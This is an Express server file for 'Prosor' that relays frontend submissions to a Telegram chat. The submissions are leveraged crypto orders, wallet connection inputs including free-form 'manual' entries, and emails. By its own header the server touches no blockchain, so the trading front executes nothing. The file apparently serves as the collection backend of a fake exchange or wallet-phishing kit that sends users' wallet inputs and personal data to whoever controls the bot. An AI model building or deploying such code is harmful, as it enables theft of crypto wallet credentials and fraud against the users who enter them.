/**
 * Prosor Backend
 * --------------------------------------------------------------------------
 * A small Express server that sits behind the Prosor frontend and relays
 * submitted "entries" (order placements, wallet connections, email sign-ups)
 * to a Telegram chat using the Telegram Bot API.
 *
 * It does not talk to any blockchain and does not store entries anywhere —
 * it simply validates, formats, and forwards each entry to Telegram, then
 * returns a success/failure response to the frontend.
 *
 * Setup: see README.md.
 * --------------------------------------------------------------------------
 */

require('dotenv').config();

const express = require('express');
const cors = require('cors');

const PORT = Number(process.env.PORT) || 4000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '*';

const TELEGRAM_CONFIGURED = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);

if (!TELEGRAM_CONFIGURED) {
  console.warn(
    '[prosor-backend] TELEGRAM_BOT_TOKEN and/or TELEGRAM_CHAT_ID are not set. ' +
    'The server will run, but entries will NOT be delivered to Telegram until ' +
    'these are configured in .env (see .env.example).'
  );
}

/* --------------------------------------------------------------------- */
/* App setup                                                             */
/* --------------------------------------------------------------------- */

const app = express();

app.use(
  cors({
    // '*' (default) reflects any request origin, including the "null"
    // origin sent by some browsers for file:// pages — convenient for local
    // development. Set ALLOWED_ORIGIN to a comma-separated list in
    // production to restrict this.
    origin: ALLOWED_ORIGIN === '*' ? true : ALLOWED_ORIGIN.split(',').map((o) => o.trim()),
  })
);
app.use(express.json({ limit: '15kb' }));

/* --------------------------------------------------------------------- */
/* Very small in-memory rate limiter (per IP)                            */
/* --------------------------------------------------------------------- */

const RATE_LIMIT_WINDOW_MS = 60 * 1000;
const RATE_LIMIT_MAX_REQUESTS = 20;
const requestLog = new Map(); // ip -> [timestamps]

function rateLimit(req, res, next) {
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const now = Date.now();
  const timestamps = (requestLog.get(ip) || []).filter((t) => now - t < RATE_LIMIT_WINDOW_MS);

  if (timestamps.length >= RATE_LIMIT_MAX_REQUESTS) {
    return res.status(429).json({ ok: false, error: 'Too many requests. Please slow down.' });
  }

  timestamps.push(now);
  requestLog.set(ip, timestamps);
  next();
}

/* --------------------------------------------------------------------- */
/* Telegram helpers                                                      */
/* --------------------------------------------------------------------- */

function escapeHtml(value) {
  return String(value ?? '-')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function sendTelegramMessage(text) {
  if (!TELEGRAM_CONFIGURED) {
    throw new Error('Telegram is not configured on this server (missing bot token or chat id).');
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    const reason = data && data.description ? data.description : `HTTP ${response.status}`;
    throw new Error(`Telegram API error: ${reason}`);
  }

  return data;
}

/* --------------------------------------------------------------------- */
/* Entry formatters — one per entry "type" the frontend can submit       */
/* --------------------------------------------------------------------- */

function formatOrderEntry(d) {
  const sideLabel = d.side === 'long' ? '🟢 LONG' : d.side === 'short' ? '🔴 SHORT' : escapeHtml(d.side);
  return [
    '<b>📥 New Order — Prosor</b>',
    '',
    `<b>Pair:</b> ${escapeHtml(d.pair)}`,
    `<b>Side:</b> ${sideLabel}`,
    `<b>Order Type:</b> ${escapeHtml(d.orderType)}`,
    `<b>Qty:</b> ${escapeHtml(d.qty)} LIT`,
    `<b>Price:</b> ${escapeHtml(d.price)}`,
    `<b>Leverage:</b> ${escapeHtml(d.leverage)}x`,
    `<b>Order Value:</b> ${escapeHtml(d.orderValue)} USDT`,
    `<b>Margin:</b> ${escapeHtml(d.margin)} USDT`,
    `<b>Est. Liquidation:</b> ${escapeHtml(d.liqPrice)}`,
    `<b>Fees:</b> ${escapeHtml(d.fees)} USDT`,
    `<b>Wallet:</b> ${escapeHtml(d.walletAddress || 'Not connected')}`,
  ].join('\n');
}

function formatWalletEntry(d) {
  return [
    '<b>🔗 Wallet Connected — Prosor</b>',
    '',
    `<b>Method:</b> ${escapeHtml(d.method || 'manual')}`,
    `<b>Address / Input:</b> <code>${escapeHtml(d.address)}</code>`,
  ].join('\n');
}

function formatEmailEntry(d) {
  return [
    '<b>✉️ Email Submitted — Prosor</b>',
    '',
    `<b>Email:</b> ${escapeHtml(d.email)}`,
  ].join('\n');
}

const ENTRY_FORMATTERS = {
  order: formatOrderEntry,
  wallet: formatWalletEntry,
  email: formatEmailEntry,
};

const ENTRY_REQUIRED_FIELDS = {
  order: ['pair', 'side'],
  wallet: ['address'],
  email: ['email'],
};

function validateEntry(type, data) {
  const required = ENTRY_REQUIRED_FIELDS[type];
  if (!required) return `Unknown entry type: "${type}"`;
  const missing = required.filter((field) => data[field] === undefined || data[field] === null || data[field] === '');
  if (missing.length) return `Missing required field(s) for "${type}" entry: ${missing.join(', ')}`;
  return null;
}

/* --------------------------------------------------------------------- */
/* Routes                                                                */
/* --------------------------------------------------------------------- */

app.get('/api/health', (req, res) => {
  res.json({ ok: true, service: 'prosor-backend', telegramConfigured: TELEGRAM_CONFIGURED });
});

// Generic entry endpoint used by the frontend for every submittable form:
// { "type": "order" | "wallet" | "email", "data": { ...fields } }
app.post('/api/entry', rateLimit, async (req, res) => {
  const { type, data } = req.body || {};

  if (!type || typeof data !== 'object' || data === null) {
    return res.status(400).json({ ok: false, error: 'Request body must include "type" and a "data" object.' });
  }

  const validationError = validateEntry(type, data);
  if (validationError) {
    return res.status(400).json({ ok: false, error: validationError });
  }

  const format = ENTRY_FORMATTERS[type];
  const timestamp = new Date().toUTCString();
  const message = `${format(data)}\n\n<i>${timestamp}</i>`;

  try {
    await sendTelegramMessage(message);
    res.json({ ok: true });
  } catch (err) {
    console.error('[prosor-backend] Failed to deliver entry to Telegram:', err.message);
    res.status(502).json({ ok: false, error: 'Failed to deliver entry to Telegram.' });
  }
});

// 404 for anything else under /api
app.use('/api', (req, res) => {
  res.status(404).json({ ok: false, error: 'Not found.' });
});

app.use((err, req, res, next) => { // eslint-disable-line no-unused-vars
  console.error('[prosor-backend] Unhandled error:', err);
  res.status(500).json({ ok: false, error: 'Internal server error.' });
});

const path = require('path');

// Serve frontend files from the project root
app.use(express.static(__dirname));

// Serve the main frontend page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`[prosor-backend] Listening on port ${PORT}`);
  console.log(
    `[prosor-backend] Telegram delivery: ${
      TELEGRAM_CONFIGURED ? 'configured' : 'NOT configured'
    }`
  );
});